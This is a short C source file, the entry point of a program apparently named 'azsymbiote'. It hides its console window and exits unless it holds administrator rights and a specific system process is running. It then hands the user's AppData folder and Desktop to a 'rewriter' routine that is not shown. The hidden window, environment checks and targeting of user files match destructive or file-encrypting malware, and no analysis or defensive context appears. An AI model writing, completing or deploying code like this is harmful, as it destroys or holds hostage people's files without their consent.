#include "azsymbiote.h"

int main(void) {
	// Hide the console window from user view
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	// Create a mutex to ensure only one instance runs
	HANDLE hMutex = CreateMutex(NULL, FALSE, "LittleRedBird");
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		CloseHandle(hMutex);
		exit_system();
	}

	// Verify if process has administrative privileges
	if (!check_elevation()) {
		exit_system();
	}

	// Verify if required system process is running
	if (!check_nlsvc()) {
		exit_system();
	}

	// Get current user information and construct paths
	char* username = get_username();
	char* az_folder = build_path(C_USER, username, C_APPDATA);
	char* user_desktop = build_path(C_USER, username, DESKTOP);

	// Verify if target directory exists
	DWORD ftyp = GetFileAttributesA(az_folder);
	if (ftyp == INVALID_FILE_ATTRIBUTES || !(ftyp & FILE_ATTRIBUTE_DIRECTORY)) {
		free(az_folder);
		free(user_desktop);
		exit_system();
	}

	// Process target directories
	rewriter(az_folder);
	rewriter(user_desktop);

	// Free allocated memory and exit
	free(az_folder);
	free(user_desktop);
	exit_system();
}
